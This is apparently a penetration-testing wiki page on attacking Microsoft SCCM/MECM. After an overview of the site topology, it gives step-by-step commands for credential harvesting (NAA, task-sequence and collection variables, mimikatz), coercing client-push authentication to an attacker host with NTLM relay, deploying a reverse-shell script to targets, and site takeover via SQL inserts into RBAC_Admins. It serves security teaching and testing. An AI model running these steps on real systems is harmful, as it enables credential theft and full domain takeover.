# SCCM / MECM

## Theory

The **System Center Configuration Manager** (SCCM), now (since 2020) known as **Microsoft Endpoint Configuration Manager** (MECM), is a software developed by Microsoft to help system administrators manage the servers and workstations in large Active Directory environments. It provides lots of features including remote control, patch management, task automation, application distribution, hardware and software inventory, compliance management and security policy administration.

SCCM is an **on-premise** solution, but Microsoft also maintains a cloud-native client management suite named **Intune**. Both Intune and SCCM are part of the "**Microsoft Endpoint Manager**"  umbrella.

### Topology

SCCM operates in a Client-Server architecture deployed on a "site", representing the SCCM environment. Each client (server or workstation) has an agent installed used to communicate with its SCCM server, the [Primary Site server](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites#BKMK\_ChoosePriimary).

Clients are logically grouped into [boundary groups](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/boundary-groups), that are a set of network locations allowing clients to communicate with the SCCM closest resources in an SCCM site.

Boundary groups also allow for [automatic site assignment](https://learn.microsoft.com/en-us/mem/configmgr/core/clients/deploy/assign-clients-to-a-site#automatic-site-assignment) for discovered clients based on their network location to attach them to the right site and ensure they receive the right configuration.

{% hint style="info" %}
Each SCCM site is identified by a three-character code to distinguish it in an SCCM hierarchy. This is needed at the client registration process.&#x20;
{% endhint %}

The primary site server manages the clients (like distributing software updates) and can have child servers attached to it ([secondary sites](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites#BKMK\_ChooseSecondary)), generally for scalability purpose.

Between the site server and clients sites [the management point](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-site-system-servers-and-site-system-roles#management-point) which is an SCCM server role allowing to provide clients with necessary policies and configuration to communicate with the site server and receive configuration data from them.

To get software packages, updates, OS images, etc. clients request the [distribution point](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-site-system-servers-and-site-system-roles#distribution-point), which is the SCCM component that hosts and distributes them.&#x20;

All information about the clients, software updates, hardware and software inventories, configuration settings of the site, etc. are stored in a Microsoft SQL Server (MSSQL) instance, known as the [site database server](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-site-database). This database is used by the site server to retrieve and store information about the managed devices and is also used by the management point to retrieve policies and configuration information needed by the SCCM clients.

In addition, another component called the [SMS Provider](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider#about), provides a set of interfaces between the site server and the site database to give the clients needed information like available software updates and allow them communicate information like status of a software deployment and inventory data to store in the site database.

<figure><img src="../../.gitbook/assets/SCCM_Topology.png" alt=""><figcaption><p>Typical multi-site architecture</p></figcaption></figure>

### Deployment types

When SCCM is installed in an Active Directory, the clients can be deployed on the workstations by six different ways:

* Client push installation (default)
* Software update-based installation
* Group Policy installation
* Manual installation
* Logon script installation
* Package and program installation

<details>

<summary>Client push installation</summary>

The first way of deploying SCCM is the **Client push installation** method, which is the default one and the least secure.&#x20;

This installation will use "client push accounts". They are service accounts with local administrative rights on the assets where SCCM will have to deploy some stuff. The system administrator creates groups of endpoints and for each of those, one "client push account". For each group, only one "client push account" can authenticate with administrator rights on the assets of this group. Thus, if an account is compromised, only the members of the corresponding group can be compromised in turn.

When the SCCM deployment is launched, it will basically try to authenticate with each client push accounts on each asset, and if the authentication fails, SCCM will try the next account in line. When the authentication succeeds, it moves to the following asset, and so on until the deployment is complete.

SCCM deployment via **Client push installation** is service accounts credentials spraying in a nutshell.

_Nota bene, there is a_ [_feature_](https://learn.microsoft.com/en-us/mem/configmgr/core/clients/deploy/deploy-clients-to-windows-computers#configure-the-site-to-automatically-use-client-push-for-discovered-computers) _(not enabled by default) allowing for automatic client push installation on all discovered clients in a boundary group in an SCCM site._

</details>

## Practice

### Attack path overview

<figure><img src="../../.gitbook/assets/SCCM-Attack-Surface-Overview.png" alt=""><figcaption><p>SCCM Attack Surface Overview</p></figcaption></figure>

### Recon

Enumerate whether SCCM is present in a target network&#x20;

{% tabs %}
{% tab title="UNIX-like" %}
[pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy), which is based on [PXEThief](https://github.com/MWR-CyberSec/PXEThief), can be used to query for PXE boot media

<figure><img src="../../.gitbook/assets/SCCM_Recon_Linux_pxethiefy.png" alt=""><figcaption></figcaption></figure>

There are a few things to note

* [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) uses broadcast requests to request DHCP PXE boot options. An SCCM setup does not have to support PXE boot and a "found" PXE server does not have to be an SCCM component. Be cautious of false positive results.
* In this case a PXE server was found and PXE media was downloaded. The location of the PXE media on the TFTP server is `\SMSTemp\...`, which indicates that this is indeed an SCCM server.

[sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can also be used to explore the Active Directory and search for SCCM/MECM assets. For this tool, a first user account is required.

```bash
```

```bash
#View the SMB configurations and running services
sccmhunter.py show -smb

#View the users
sccmhunter.py show -user

#View the servers
sccmhunter.py show -computers

#View everything
sccmhunter.py show -all
```
{% endtab %}

{% tab title="Windows" %}
Using LDAP queries from a **domain-joined** Windows machine

```powershell
## LDAP search via PS
PS C:\> ([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
```

<figure><img src="../../.gitbook/assets/SCCM_Recon_ADSI.png" alt=""><figcaption></figcaption></figure>

Using WMI queries or [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) to query a clients local WMI database

```powershell
## WMI
PS C:\> Get-WmiObject -Class SMS_Authority -Namespace root\CCM
## SharmSCCP
PS C:\> .\SharpSCCM.exe local site-info
```

<figure><img src="../../.gitbook/assets/SCCM_Recon_WMI-SharpSCCM.png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

### Privilege Escalation

Currently there are two different pathways for privilege escalation routes in an SCCM environment:

* Credential harvesting
* Authentication Coercion

#### Credential harvesting

The following SCCM components can contain credentials:

* Device Collection variables
* TaskSequence variables
* Network Access Accounts (NAAs)
* Client Push Accounts
* Application & Scripts (potentially)

Find more details about these components in [this blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) post.

{% tabs %}
{% tab title="UNIX-based" %}
From UNIX-like systems, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher the WMI blob via DPAPI and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.

```powershell
SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
```

**Harvest NAA credentntials**

{% hint style="warning" %}
The tool author ([Adam Chester](https://twitter.com/\_xpn\_)) warns not to use this script in production environments.
{% endhint %}

Step 1: Gain control over computer account password

```bash
$:> python3 impacket/examples/addcomputer.py -dc-ip 10.250.2.200 -computer-name addedcomp1 -computer-pass Ndjqje8341 SafeAlliance.local/Frank.Zapper:b                                                                                               
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account addedcomp1$ with password Ndjqje8341.
```

Step 2: Use sccmwtf.py to extract NAA secrets

```bash
$:> sccmwtf.py <CompAccountNetBiosName> <CompAccountFQDN> <SCCMMPNetBiosName> "<Domain>\<CompAccountName>$" "<CompAccountPassword>"
## Example
$:> sccmwtf.py addedcomp1 addedcomp1.SafeAlliance.local SA-SCCM-1 "SafeAlliance\addedcomp1$" "Ndjqje8341"
```

Step 3: Obtain obfuscated NAA secrets

The obufscated NAA secrets will be saved in a local file

```bash
$:> cat /tmp/naapolicy.xml
```

Step 4: Decode obfuscated strings

To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)

Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/\_xpn\_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.

```bash
#Create a new computer account and request the policies

```
{% endtab %}

{% tab title="From Windows" %}
**Harvest NAA credentials**

```powershell
# Locally
## Locally From WMI
PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
## Extracting from CIM store
PS:> .\SharpSCCM.exe local secretes disk
## Extracting from WMI
PS:> .\SharpSCCM.exe local secretes wmi
## Using SharpDPAPI
PS:> .\SharpDPAPI.exe SCCM
## Using mimikatz
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::sccm

# Remotely from policy
PS:> .\SharpSCCM.exe get secretes
```

**Harvest TaskSequence variables**

```powershell
# Locally
## Locally from WMI 
PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
## Extracting from CIM store
PS:> .\SharpSCCM.exe local secrets -m disk
## Extracting from WMI
PS:> .\SharpSCCM.exe local secrets -m wmi

# Remotely from policy
PS:> .\SharpSCCM.exe get secrets
```

**Harvest Device Collection variables**

```powershell
# Locally if device has been assigned Collection variables
## Locally from WMI 
PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
## Locally from CIM store
PS:> .\SharpSCCM.exe local secrets -m disk
## Locally from WMI
PS:> .\SharpSCCM.exe local secrets -m wmi
```

<figure><img src="../../.gitbook/assets/SharpSCCM-get-secrets-command.png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

#### Authentication Coercion via Client Push Installation

With a compromised machine in an Active Directory where SCCM is deployed via **Client Push Accounts** on the assets, it is possible to have the "Client Push Account" authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. [NTLM capture](ntlm/capture.md)). The "Client Push Account" usually has local administrator rights to a lot of assets.

{% hint style="info" %}
In some case, the "Client Push Accounts"  could even be part of the Domain Admins group, leading to a complete takeover of the domain.
{% endhint %}

The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.

**Option 1: Wait for Client Push Installation**

```powershell
## Credential capture using Inveigh 
PS:> .\Inveigh.exe
```

**Option 2: Forcefully "coerce" the Client Push Installation**

{% hint style="danger" %}
Important note: You want to read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) post before you continue this route, as this attack might leave traces behind and might junk up the SCCM environment.
{% endhint %}

**Step 1: Prepare coercion receiver**&#x20;

Note that you could either capture & crack received credentials or relay them to a suitable target system (or both).

```sh
# On Linux
## Relay using ntlmrelayx.py
$:> python3 examples/ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
# On Windows
## Credential capture using Inveigh 
PS:> .\Inveigh.exe
```

**Step 2: Trigger Client-Push Installation**

```PowerShell
## If admin access over Management Point (MP)
PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
## If not MP admin
PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer>
```

**Step 3: Cleanup**&#x20;

If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.

### Lateral Movement

#### Admin & Special Account Enumeration

This step requires administrative privileges over the SCCM Management Point (MP) in order to query the MP's WMI database.

{% tabs %}
{% tab title="Windows" %}
**Admin Users**

```powershell
PS:> .\SharpSCCM.exe get class-instances SMS_ADMIN
```

**Special Accounts**

```powershell
PS:> .\SharpSCCM.exe get class-instances SMS_SCI_Reserved
```

<div>

<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_User_Enum.png" alt=""><figcaption><p>Admin user enumeration in SCCM</p></figcaption></figure>

 

<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Special_Account_Enum.png" alt=""><figcaption><p>Special Account Enumeration in SCCM</p></figcaption></figure>

</div>
{% endtab %}
{% endtabs %}

#### Applications and scripts deployment

{% tabs %}
{% tab title="SharpSCCM" %}
References:

* [https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)

**Step 1: Confirm Access permissions**

```powershell
PS:> .\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
```

**Step 2: Find target device**

```powershell
## Search for device of user "Frank.Zapper"
PS:> .\SharpSCCM.exe get primary-users -u Frank.Zapper

## List all active SCCM devices where the SCCM client is installed 
### CAUTION: This could be huge
PS:> .\SharpSCCM.exe get devices -w "Active=1 and Client=1"
```

**Step 3: Deploy Application to target device**

In this final step you can chose to either create an actual application to deploy to the target machine or just trigger an install from a remote UNC path in order to capture and relay an incoming NTLM authentication. Note the following:

* Coercing an authentication might be stealthier (and requires less cleanup) than installing an application
* To capture and relay NTLM credentials, the target device must support NTLM (very likely).
* The neat part: The Authentication can be coerced using the primary user account of the device OR the device computer account (you can choose)

```bash
## Prep capturing server
## ntlmrelayx targeting 10.250.2.179
$:> sudo python3 ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
## Also keep Pcredz running, just in case
$:> sudo python3 ./Pcredz -i enp0s8 -t


## Run attack
PS:>.\SharpSCCM.exe exec -rid <TargetResourceID> -r <AttackerHost>
```

Note that the incoming authentication requsts might take a while (couple minutes) to roll in...

<div>

<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment (1).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Capture_Authentication.png" alt=""><figcaption></figcaption></figure>

</div>
{% endtab %}

{% tab title="PowerSCCM" %}
With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory machines with [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) (Powershell).

<pre class="language-powershell"><code class="lang-powershell"><strong># Create a SCCM Session via WMI with the Site Code
</strong>Find-SccmSiteCode -ComputerName SCCMServer
New-SccmSession -ComputerName SCCMServer -SiteCode &#x3C;site_code> -ConnectionType WMI

# Retrieve the computers linked to the SCCM server
Get-SccmSession | Get-SccmComputer

# Create a computer collection
Get-SccmSession | New-SccmCollection -CollectionName "collection" -CollectionType "Device"

# Add computers to the collection
Get-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "target" -CollectionName "collection"

# Create an application to deploy
Get-SccmSession | New-SccmApplication -ApplicationName "evilApp" -PowerShellB64 "&#x3C;powershell_script_in_Base64>"

# Create an application deployment with the application and the collection previously created
Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "evilApp" -AssignmentName "assig" -CollectionName "collection"

# Force the machine in the collection to check the application update (and force the install)
Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "collection"
</code></pre>

If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.&#x20;

This [pull request](https://github.com/PowerShellMafia/PowerSCCM/pull/6) on PowerSCCM can be used to do everything in one command. It uses the script `configurationmanager.psd1` created by Microsoft, usually installed on SCCM servers.

```powershell
# Create a CM drive if it doesn't already exist and deploy a CMScript on a target
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevice 'target' -Path '.\reverseTCP.ps1' -ScriptName 'evilScript'
```
{% endtab %}
{% endtabs %}

#### AdminService API

Among all the services offered by SCCM to the administrator, there is one named **CMPivot**. This service, located on the MP server, can enumerate all the resources of a computer or computer collection (installed software, local administrators, hardware specification, etc.), and perform administrative tasks on them. It uses a HTTP REST API, named **AdminService**, provided by the SMS Provider server.

It appears that, with SCCM administrative rights, it is possible to directly interact with the **AdminService** API, without using CMPivot, for post SCCM exploitation purpose.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.

```bash
python3 sccmhunter.py admin -u "LAB\USER" -p PASSWORD -ip <site_server_IP>
```

Then, the `help` command can be typed in the opened shell to view all the CMPivot commands handled by [sccmhunter](https://github.com/garrettfoster13/sccmhunter).

```bash
() C:\ >> help

Documented commands (use 'help -v' for verbose/'help <topic>' for details):

Database Commands
=================
get_collection  get_device  get_lastlogon  get_puser  get_user

Interface Commands
==================
exit  interact

PostEx Commands
===============
add_admin  backdoor  backup  delete_admin  restore  script

Situational Awareness Commands
==============================
administrators  console_users  ipconfig   osinfo    sessions
cat             disk           list_disk  ps        shares  
cd              environment    ls         services  software
```
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used for this purpose.

**Step 1: retrieve the ID of the resource to enumerate (a computer or a computer collection)**

```powershell
.\SharpSCCM.exe get resource-id -d "COMPUTER"
```

**Step 2: execute administrative tasks with CMPivot requests**

```powershell
#Enumerate the local administrators
.\SharpSCCM.exe invoke admin-service -r <resource_ID> -q "Administrators" -j

#Enumerate the installed softwares
.\SharpSCCM.exe invoke admin-service -r <resource_ID> -q "InstalledSoftware" -j
```

Instructions about how to write CMPivot queries are presented [here](https://learn.microsoft.com/fr-fr/mem/configmgr/core/servers/manage/cmpivot).
{% endtab %}
{% endtabs %}

### SCCM Site Takeover

The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](sccm-mecm.md#topology)).&#x20;

> The user account that installs the site must have the following permissions:
>
> * **Administrator** on the following servers:
>   * The site server
>   * Each SQL Server that hosts the **site database**
>   * Each instance of the **SMS Provider** for the site
> * **Sysadmin** on the instance of SQL Server that hosts the site database
>
> _(source:_ [_Microsoft.com_](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites)_)_

This means that it is possible to obtain administrative access on the site database server, or interact as a local administrator with the HTTP API on the SMS Provider, by relaying a NTLM authentication coming from the primary site server, for example by coercing an automatic client push installation from it, and granting full access on the SCCM site to a controlled user.

{% hint style="info" %}
For more details about how these attacks work, refer to the article "[SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem) for the database attack, and "[Site Takeover via SCCM’s AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)" by [Garrett Foster](https://twitter.com/garrfoster) for the HTTP one.
{% endhint %}

#### Relay to the MSSQL site database

{% hint style="warning" %}
Some requirements are needed to perform the attack:&#x20;

* automatic site assignment and automatic site-wide [client push installation](sccm-mecm.md#client-push-installation-1) are enabled
* fallback to NTLM authentication is enabled (default)
* the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) not installed (it prevents the client push installation account to perform an NTLM connection to a client)
* PKI certificates are not required for client authentication (default)
*   &#x20;either:

    * MSSQL is reachable on the site database server

    OR

    * SMB is reachable and SMB signing isn’t required on the site database server
* knowing the three-character site code for the SCCM site is required (step 3 below)
* knowing the NetBIOS name, FQDN, or IP address of a site management point is required
* knowing the NetBIOS name, FQDN, or IP address of the site database server is required

The first four requirements above apply to the [client push installation coercion technique](sccm-mecm.md#client-push-installation). But without them, a regular coercion technique could still be used (petitpotam, printerbug, etc.).
{% endhint %}

1. Retrieve the controlled user SID&#x20;

The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [#4.-obtain-an-sql-console](sccm-mecm.md#4.-obtain-an-sql-console "mention").

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, the Samba utility named [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can be used for this purpose.

```bash
rpcclient -c "lookupnames USER" $TARGET_IP
```

Impacket's [lookupsid](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) (Python) can also be used to retrieve the user's SID.

```bash
lookupsid.py "$DOMAIN"/"$USERNAME":"$PASSWORD"@"$TARGET_IP_OR_NAME"
```

The returned SID value is in canonical format and not hexadecimal, [impacket](https://github.com/fortra/impacket/blob/34229464dab9ed4e432fdde56d14a916baaac4db/impacket/ldap/ldaptypes.py#L48) can be used to convert it as follows.

{% code overflow="wrap" %}
```python
from impacket.ldap import ldaptypes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('sid_value')
print('0x' + ''.join('{:02X}'.format(b) for b in sid.getData()))
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used for this purpose.

```
# this should be run on the windows SCCM client as the user (no need for admin privileges here)
.\SharpSCCM.exe get user-sid
```
{% endtab %}
{% endtabs %}

2. Setup NTLM relay server

The target of the [NTLM relay attack](ntlm/relay.md) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose. In the examples below, the `-socks` option is used for more versatility but is not required.

```bash
# targetting MS-SQL
ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks

# targeting SMB
ntlmrelayx.py -t "siteDatabase.domain.local" -smb2support -socks
```
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it doesn't feature the same SOCKS functionality, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
{% endtab %}
{% endtabs %}

Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](ntlm/relay.md).

3. Authentication coercion

The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc.).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, authentication can be coerced through [PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).

There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```powershell
.\SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
```
{% endcode %}
{% endtab %}
{% endtabs %}

The rest of this page is focusing on relaying the authentication on the MS-SQL service.

4. Obtain an SQL console

If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, [Impacket](https://github.com/fortra/impacket)'s [mssqlclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) can be used for that purpose.

```bash
proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
```

Once the console is obtained, the attack can proceed to granting the user full privileges by running the following commands in the SQL console.

<pre class="language-sql"><code class="lang-sql">--Switch to site database
<strong>use CM_&#x3C;site_code>
</strong>
--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
<strong>INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (&#x3C;SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','&#x3C;site_code>');
</strong>
--Retrieve the AdminID of the added user
<strong>SELECT AdminID,LogonName FROM RBAC_Admins;
</strong>
--Add records to the RBAC_ExtendedPermissions table granting the AdminID the Full Administrator (SMS0001R) RoleID for the “All Objects” scope (SMS00ALL), 
--the “All Systems” scope (SMS00001), 
--and the “All Users and User Groups” scope (SMS00004)
<strong>INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&#x3C;AdminID>,'SMS0001R','SMS00ALL','29');
</strong><strong>INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&#x3C;AdminID>,'SMS0001R','SMS00001','1');
</strong><strong>INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&#x3C;AdminID>,'SMS0001R','SMS00004','1');
</strong></code></pre>

It is then possible to verify the new privileges on SCCM.

<pre class="language-powershell"><code class="lang-powershell"># this should be run on the windows SCCM client as the user that was just given full administrative role to 
<strong>.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "&#x3C;site_code>"
</strong></code></pre>

Post exploitation via SCCM can now be performed on the network.

#### Relay to the HTTP API AdminService

{% hint style="warning" %}
Some requirements are needed to perform the attack:

* The HTTP API for the **AdminService** service is reachable on the SMS Provider server
* knowing the NetBIOS name, FQDN, or IP address of a site management point is required
* knowing the NetBIOS name, FQDN, or IP address of the site SMS provider server is required
{% endhint %}

1. Setup an NTLM relay server

The target of the [NTLM relay attack](ntlm/relay.md) must be set to the SMS Provider server, on the HTTP/S service (port `80/tcp` or `443/tcp`).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.

```bash
ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid <USER_SID>
```
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it doesn't feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
{% endtab %}
{% endtabs %}

Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](ntlm/relay.md).

2. Authentication coercion

The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/\_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc.).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, authentication can be coerced through [PrinterBug](print-spooler-service/printerbug.md), [PetitPotam](mitm-and-coerced-authentications/ms-efsr.md), [ShadowCoerce](mitm-and-coerced-authentications/ms-fsrvp.md), [DFSCoerce](mitm-and-coerced-authentications/ms-dfsnm.md), etc. (not based on triggering the client push installation).

There isn't any UNIX-like alternative to the `SharpSCCM.exe invoke client-push` feature (yet).
{% endtab %}

{% tab title="Windows" %}
```powershell
.\SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "<site_code>" -t "attacker.domain.local"
```
{% endtab %}
{% endtabs %}

If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the sms provider server, the controlled should be now a SCCM site admin.

It is then possible to verify the new privileges on SCCM.

```powershell
# this should be run on the windows SCCM client as the user that was just given full administrative role to 
.\SharpSCCM.exe get site-push-settings -mp "SCCM-Server" -sc "<site_code>"
```

Post exploitation via SCCM can now be performed on the network.

{% hint style="warning" %}
The tool author ([Chris Thompson](https://mobile.twitter.com/\_mayyhem)) warns that [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) is a PoC only tested in lab. One should be careful when running in production environments.&#x20;
{% endhint %}

### SCCM Hierarchy takeover

In really big environments that host multiple SCCM sites (think about a big company, with one SCCM site per continent), it is possible to encounter a **Central Administration Site (CAS)**. This type of site allows to manage all the primary sites from one point, make some reporting, and is totally optional.

